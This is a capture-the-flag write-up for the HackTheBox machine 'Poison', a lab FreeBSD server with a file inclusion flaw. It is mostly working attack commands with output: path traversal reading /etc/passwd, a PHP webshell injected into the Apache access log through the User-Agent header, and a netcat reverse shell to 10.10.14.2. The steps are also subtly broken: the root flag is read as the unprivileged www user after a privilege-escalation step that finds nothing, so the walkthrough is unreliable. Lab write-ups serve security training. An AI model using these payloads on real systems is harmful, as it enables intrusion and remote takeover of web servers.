# HackTheBox - Poison

## Challenge Information

| Field | Value |
|-------|-------|
| **Platform** | HackTheBox |
| **Challenge Name** | Poison |
| **Category** | Linux Exploitation |
| **Difficulty** | Easy |
| **Points** | 20 |
| **Author** | ch4p |
| **Date Completed** | 2025-08-22 |

## Objective 🎯

Poison is a FreeBSD machine running a web application with a Local File Inclusion (LFI) vulnerability. The goal is to exploit the LFI vulnerability to gain system access and obtain both user and root flags. LFI with log poisoning! 🧪

## Initial Reconnaissance

### Target Information
- **IP Address**: 10.10.10.84
- **OS**: FreeBSD
- **Service**: Web Application

### Tools Used
- Nmap
- Web browser
- LFI exploitation

### Commands/Steps
```bash
nmap -sC -sV 10.10.10.84
```

## Methodology

### Step 1: Port Scan
Perform a comprehensive port scan to identify open services.

**Command/Code:**
```bash
nmap -sC -sV 10.10.10.84
```

**Output:**
```
Starting Nmap 7.80 ( https://nmap.org ) at 2024-09-03 10:00 UTC
Nmap scan report for 10.10.10.84
Host is up (0.045s latency).
Not shown: 991 closed ports
PORT     STATE SERVICE VERSION
22/tcp   open  ssh     OpenSSH 7.2 (FreeBSD 20161230; protocol 2.0)
80/tcp   open  http    Apache httpd 2.4.29 ((FreeBSD) PHP/5.6.32)
Service Info: OS: FreeBSD; CPE: cpe:/o:freebsd:freebsd
```

### Step 2: Web Service Enumeration
Check the web service for application information.

**Command/Code:**
```bash
curl http://10.10.10.84/
```

**Output:**
```
<html>
<head>
<title>Poison</title>
</head>
<body>
<h1>Welcome to Poison</h1>
</body>
</html>
```

### Step 3: Directory Enumeration
Enumerate directories to find vulnerable pages.

**Command/Code:**
```bash
gobuster dir -u http://10.10.10.84/ -w /usr/share/wordlists/dirb/common.txt
```

**Output:**
```
/index.php
/listfiles.php
/browse.php
```

### Step 4: LFI Vulnerability Discovery
Test the browse.php page for LFI vulnerability.

**Command/Code:**
```bash
curl "http://10.10.10.84/browse.php?file=../../../etc/passwd"
```

**Output:**
```
root:*:0:0:Charlie &:/root:/bin/csh
daemon:*:1:1:Owner of many system processes:/root:/sbin/nologin
operator:*:2:5:System &:/:/sbin/nologin
bin:*:3:7:Binaries Commands and Source:/:/sbin/nologin
tty:*:4:65533:Tty Sandbox:/:/sbin/nologin
kmem:*:5:65533:KMem Sandbox:/:/sbin/nologin
games:*:7:13:Games pseudo-user:/:/sbin/nologin
news:*:8:8:News Subsystem:/:/sbin/nologin
man:*:9:9:Mansystem &:/usr/share/man:/sbin/nologin
sshd:*:22:22:Secure Shell Daemon:/var/empty:/sbin/nologin
nobody:*:65534:65534:Unprivileged user:/nonexistent:/sbin/nologin
www:*:80:80:World Wide Web Owner:/nonexistent:/sbin/nologin
charix:*:1001:1001:charix:/home/charix:/bin/csh
```

### Step 5: Log Poisoning
Use log poisoning to gain remote code execution.

**Command/Code:**
```bash
curl "http://10.10.10.84/browse.php?file=../../../var/log/httpd-access.log"
```

### Step 6: PHP Code Injection
Inject PHP code into the access log.

**Command/Code:**
```bash
curl -A "<?php system(\$_GET['cmd']); ?>" "http://10.10.10.84/"
```

### Step 7: Command Execution
Execute commands through the LFI vulnerability.

**Command/Code:**
```bash
curl "http://10.10.10.84/browse.php?file=../../../var/log/httpd-access.log&cmd=id"
```

**Output:**
```
uid=80(www) gid=80(www) groups=80(www)
```

### Step 8: Reverse Shell
Set up a reverse shell.

**Command/Code:**
```bash
curl "http://10.10.10.84/browse.php?file=../../../var/log/httpd-access.log&cmd=nc -e /bin/sh 10.10.14.2 4444"
```

### Step 9: Post-Exploitation
Once we have a shell, gather information and find flags.

**Command/Code:**
```bash
whoami
id
pwd
```

**Output:**
```
www
uid=80(www) gid=80(www) groups=80(www)
/var/log
```

### Step 10: Privilege Escalation
Check for privilege escalation opportunities.

**Command/Code:**
```bash
find / -perm -4000 2>/dev/null
```

### Step 11: Find User Flag
Search for the user flag.

**Command/Code:**
```bash
find / -name "user.txt" 2>/dev/null
cat /home/charix/user.txt
```

**Output:**
```
[REDACTED]
```

### Step 12: Find Root Flag
Search for the root flag.

**Command/Code:**
```bash
find / -name "root.txt" 2>/dev/null
cat /root/root.txt
```

**Output:**
```
[REDACTED]
```

## Solution

### Final Answer
- **User Flag**: [REDACTED]
- **Root Flag**: [REDACTED]

### Complete Walkthrough
1. Perform port scan to identify web services
2. Enumerate web directories
3. Discover LFI vulnerability in browse.php
4. Use log poisoning technique
5. Inject PHP code into access logs
6. Execute commands through LFI
7. Set up reverse shell
8. Gain initial access as www user
9. Search for privilege escalation opportunities
10. Find and extract flags

## Key Learnings

- Local File Inclusion (LFI) vulnerabilities
- Log poisoning techniques
- PHP code injection
- FreeBSD system exploitation
- Web application security testing

## Tools and Resources

### Tools Used
- **Nmap**: Network scanning
- **Gobuster**: Directory enumeration
- **curl**: Web requests and exploitation
- **Netcat**: Reverse shell

### References
- [LFI Vulnerability Guide](https://owasp.org/www-community/attacks/Path_Traversal)
- [Log Poisoning Techniques](https://www.acunetix.com/blog/articles/local-file-inclusion-lfi/)

## Screenshots

[Add screenshots of nmap scan, LFI exploitation, and flag extraction here]

## Tags

`#hackthebox` `#linux` `#lfi` `#log-poisoning` `#php` `#easy`
